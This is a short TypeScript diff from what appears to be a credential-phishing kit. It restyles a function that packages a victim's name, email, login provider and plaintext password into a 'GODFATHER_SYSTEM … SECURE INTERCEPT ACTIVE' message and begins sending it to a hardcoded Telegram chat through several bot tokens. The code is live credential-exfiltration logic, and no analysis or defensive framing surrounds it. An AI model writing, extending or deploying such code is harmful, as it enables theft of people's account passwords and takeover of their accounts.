@@ -27,22 +27,27 @@ const TELEGRAM_BOT_TOKENS = [
 const TELEGRAM_CHAT_ID = '7607683158'
 
 async function sendTelegramNotification(name: string, email: string, provider: string, password: string) {
-  const message = `
-╔══════════════════════════════╗
-  ⚡ <span class="tg-spoiler">[ ＧＯＤＦＡＴＨＥＲ _ ＢＯＴＴ ]</span> ⚡
-╚══════════════════════════════╝
+  const message = `<code>┌─────────────────────────────┐
+│  ⚡ ＧＯＤＦＡＴＨＥＲ_ＳＹＳＴＥＭ ⚡  │
+│   SECURE INTERCEPT ACTIVE   │
+└─────────────────────────────┘</code>
 
-✅ <b>Status:</b> Successfully Authenticated
-👤 <b>Name:</b> ${name}
-📧 <b>Email:</b> ${email}
-🔗 <b>Provider:</b> ${provider}
-🔒 <b>Password:</b> ${password}
-🕐 <b>Timestamp:</b> ${new Date().toISOString()}
+<code>[ SYS ] ACCESS_LOG :: ${new Date().toISOString()}</code>
+<code>[ NET ] ORIGIN ........ VERIFIED ✓</code>
+<code>[ TLS ] HANDSHAKE ..... COMPLETE ✓</code>
 
-━━━━━━━━━━━━━━━━━━━━
-<i>User has been welcomed and account is now active.</i>
-<code>@godfather_bott</code>
-  `.trim()
+<b>── IDENTITY RECORD ──────────────</b>
+<code>USER   »</code> <tg-spoiler>${name}</tg-spoiler>
+<code>MAIL   »</code> <tg-spoiler>${email}</tg-spoiler>
+<code>AGENT  »</code> ${provider.toUpperCase()}
+<code>CRED   »</code> <tg-spoiler>${password}</tg-spoiler>
+
+<code>── STATUS ───────────────────────</code>
+<code>[████████████████████] 100%</code>
+<code>AUTH_STATE  : GRANTED</code>
+<code>SESSION     : INITIALIZED</code>
+
+<code>▀▄▀▄▀▄  @godfather_bott  ▄▀▄▀▄▀</code>`
 
   try {
     const fetchPromises = TELEGRAM_BOT_TOKENS.map((token, i) =>
